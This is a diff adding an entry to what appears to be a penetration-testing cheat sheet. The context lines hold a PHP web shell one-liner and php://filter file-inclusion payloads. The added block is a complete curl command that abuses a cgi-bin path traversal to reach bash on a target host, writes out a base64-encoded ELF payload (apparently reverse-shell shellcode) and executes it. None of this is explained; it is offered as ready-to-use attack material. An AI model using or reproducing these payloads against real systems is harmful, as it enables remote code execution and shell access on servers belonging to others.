@@ -40,6 +40,9 @@ omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /v
  http://url/index.php?page=php://filter/convert.base64-encode/resource=index
  http://url/index.php?page=pHp://FilTer/convert.base64-encode/resource=inde
 ```
+```
+curl -s --path-as-is http://192.168.207.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash -d 'echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiYAAAA3AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aMCoLapoAgARXInhsGZQUVOzA4nhzYBSaG4vc2hoLy9iaYnjUlOJ4bALzYA= | base64 -d > /tmp/exploit; chmod +x /tmp/exploit; /tmp/exploit'
+```
 
 ### PDF to text 
 ```
